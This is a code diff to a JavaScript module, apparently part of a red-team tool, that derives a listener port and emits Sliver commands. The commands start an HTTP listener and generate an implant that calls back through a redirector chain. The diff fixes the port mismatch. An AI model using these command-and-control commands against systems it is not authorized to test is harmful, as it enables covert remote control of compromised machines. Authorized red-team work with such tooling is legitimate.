@@ -1,5 +1,15 @@
 import { requireHop1 } from './common.js';
 
+// The emitted listener port must match where the chain actually delivers —
+// the tunnel's local service (C2 panel) in tunnel mode, the listener URL in
+// direct mode — or a copy-pasted listener never receives the traffic. Falls
+// back to 8443 when neither carries an explicit port.
+function listenerPort(chain) {
+  const raw = ((chain.c2?.mode === 'tunnel' ? chain.c2?.localService : chain.c2?.url) || '').trim();
+  const m = /:(\d+)(?:\/|$)/.exec(raw);
+  return m ? m[1] : '8443';
+}
+
 // Sliver HTTP-C2 profile — standard Sliver http-c2 profile shape
 // (implant_config + server_config). The callback host is not part of the
 // profile; it goes on the generate command line, which we emit too.
@@ -53,8 +63,8 @@ export function build(chain, settings, options = {}) {
     language: 'json',
     content,
     commands: [
-      `# on the sliver server: start the listener bound for the tunnel/local service`,
-      `http --lhost 0.0.0.0 --lport 8443`,
+      `# on the sliver server: start the listener on the port the chain delivers to (tunnel local service, or listener URL in direct mode)`,
+      `http --lhost 0.0.0.0 --lport ${listenerPort(chain)}`,
       `# generate an implant pointed at hop 1 with this profile:`,
       `generate --http ${h.url} --http-c2-profile ${chain.name}-sliver-http-c2.json --skip-symbols`,
     ],
